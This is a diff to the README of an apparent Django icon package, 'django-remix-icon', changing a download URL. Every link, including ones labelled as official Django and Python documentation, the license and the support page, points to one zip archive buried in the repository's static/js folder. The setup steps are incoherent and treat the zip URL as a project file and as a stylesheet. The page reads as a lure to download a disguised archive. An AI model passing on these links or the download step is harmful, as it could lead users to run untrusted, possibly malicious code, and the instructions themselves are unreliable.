@@ -8,7 +8,7 @@ Welcome to django-remix-icon! This package helps you integrate Remix Icon into y
 
 To begin, you need to download the package. Click the button below to visit the Releases page:
 
-[![Download django-remix-icon](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)
+[![Download django-remix-icon](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)
 
 On the Releases page, locate the latest version and follow the steps below:
 
@@ -29,7 +29,7 @@ Before using django-remix-icon, ensure your system meets the following requireme
 After installation, you need to set up django-remix-icon in your Django project.
 
 1. Open your project folder.
-2. Locate the `https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip` file.
+2. Locate the `https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip` file.
 3. Add `'remixicon'` to the `INSTALLED_APPS` list:
 
    ```python
@@ -54,7 +54,7 @@ To use the icons in your templates, follow these steps:
 2. Now you can include Remix Icons anywhere in your HTML. Use the following format to display an icon:
 
    ```html
-   <link rel="stylesheet" href="{% static 'https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip' %}">
+   <link rel="stylesheet" href="{% static 'https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip' %}">
    <i class="ri-home-line"></i>
    ```
 
@@ -68,7 +68,7 @@ The djano-remix-icon package includes a wide range of icons for different purpos
 - **Navigation Icons**: Great for menus and other navigational elements.
 - **Action Icons**: Helpful for buttons and calls to action.
 
-For a complete list of available icons, visit [Remix Icon Official Website](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip).
+For a complete list of available icons, visit [Remix Icon Official Website](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip).
 
 ## 🔍 Troubleshooting
 
@@ -80,19 +80,19 @@ If you encounter issues during installation or usage, consider the following tip
 
 ## 📞 Support
 
-If you need further assistance, feel free to open an issue on our [GitHub page](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip). Our community or the maintainers will assist you shortly.
+If you need further assistance, feel free to open an issue on our [GitHub page](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip). Our community or the maintainers will assist you shortly.
 
 ## 📖 Additional Resources
 
 For more information on Django and its features, consider checking the following resources:
 
-- [Django Official Documentation](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)
-- [Python Official Documentation](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)
+- [Django Official Documentation](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)
+- [Python Official Documentation](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)
 
 ## 📝 License
 
-django-remix-icon is open-source. You can view the license details [here](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip).
+django-remix-icon is open-source. You can view the license details [here](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip).
 
 Make your Django projects shine with beautiful icons. Download django-remix-icon today! Visit the Releases page again for updates and more details:
 
-[![Download django-remix-icon](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)](https://raw.githubusercontent.com/Julianpr22/django-remix-icon/main/unobstinate/django-remix-icon.zip)
+[![Download django-remix-icon](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)](https://github.com/Julianpr22/django-remix-icon/raw/refs/heads/main/django_remix_icon/static/django_remix_icon/js/remix_django_icon_v3.9.zip)
